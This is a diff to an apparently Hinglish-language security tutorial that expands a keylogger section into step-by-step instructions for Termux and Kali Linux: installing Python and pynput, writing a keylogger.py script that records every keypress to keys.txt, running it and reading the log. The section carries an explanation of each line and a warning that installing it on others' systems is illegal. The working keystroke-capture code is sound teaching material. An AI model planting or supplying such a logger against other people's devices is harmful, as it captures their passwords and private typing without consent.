@@ -1421,21 +1421,60 @@ operating system ke core mein chhup ke baithta hai — sabse dangerous. detect k
 
 isko samajhna zaroori hai kyunki **yahi foundation hai** — poori duniya ke 90% software keyloggers isi concept pe kaam karte hain.
 
-Kali Linux aur Termux dono mein Python pehle se available hai. ek library use hoti hai — `pynput` — jo keyboard events sun sakti hai.
+ek library use hoti hai — `pynput` — jo keyboard events sun sakti hai. chalao isko step by step:
 
-**pynput install karo:**
+---
 
-Kali Linux mein:
+**Step 1 — Python install karo**
+
+Termux mein:
 ```bash
-pip install pynput
+pkg install python
 ```
+
+Kali Linux mein (mostly pehle se hoti hai, phir bhi check karo):
+```bash
+sudo apt install python3 python3-pip -y
+```
+
+> verify karo — version dikhe matlab install hai:
+> ```bash
+> python3 --version
+> ```
+
+---
+
+**Step 2 — pynput library install karo**
 
 Termux mein:
 ```bash
 pip install pynput
 ```
 
-**simple keylogger script — samjho kaise kaam karta hai:**
+Kali Linux mein:
+```bash
+pip3 install pynput
+```
+
+---
+
+**Step 3 — keylogger script likho**
+
+ek naya file banao — naam dete hain `keylogger.py`:
+
+Termux mein:
+```bash
+nano keylogger.py
+```
+
+Kali Linux mein:
+```bash
+nano keylogger.py
+```
+
+> `nano` ek simple text editor hai terminal ke andar. Nahi hai toh: Termux → `pkg install nano` | Kali → `sudo apt install nano`
+
+Ab yeh code andar paste karo:
 
 ```python
 from pynput.keyboard import Key, Listener
@@ -1454,6 +1493,8 @@ with Listener(on_press=on_press) as listener:
     listener.join()
 ```
 
+Save karo: `Ctrl + X` → `Y` → `Enter`
+
 **yeh script kya karti hai — line by line:**
 
 - `from pynput.keyboard import Key, Listener` — keyboard sunne wala library import karo
@@ -1463,7 +1504,21 @@ with Listener(on_press=on_press) as listener:
 - `AttributeError` — special keys (Enter, Shift, Ctrl) ka `char` nahi hota, unhe `[key]` format mein save karo
 - `Listener(on_press=...)` — background mein keyboard ki sunwai shuru
 
-isko chalao (`python3 keylogger.py`) aur phir kuch type karo — `keys.txt` file mein sab record hoga.
+---
+
+**Step 4 — script chalao aur test karo**
+
+```bash
+python3 keylogger.py
+```
+
+ab kuch bhi type karo terminal mein — phir `Ctrl + C` se band karo, aur dekho:
+
+```bash
+cat keys.txt
+```
+
+`keys.txt` file mein sab kuch record hoga — bilkul aise hi jaise real keylogger karta hai.
 
 > **⚠️ yeh sirf apne khud ke system pe, samajhne ke liye chalao.** kisi aur ke system pe install karna illegal hai — bina permission ke monitoring crime hai.
 
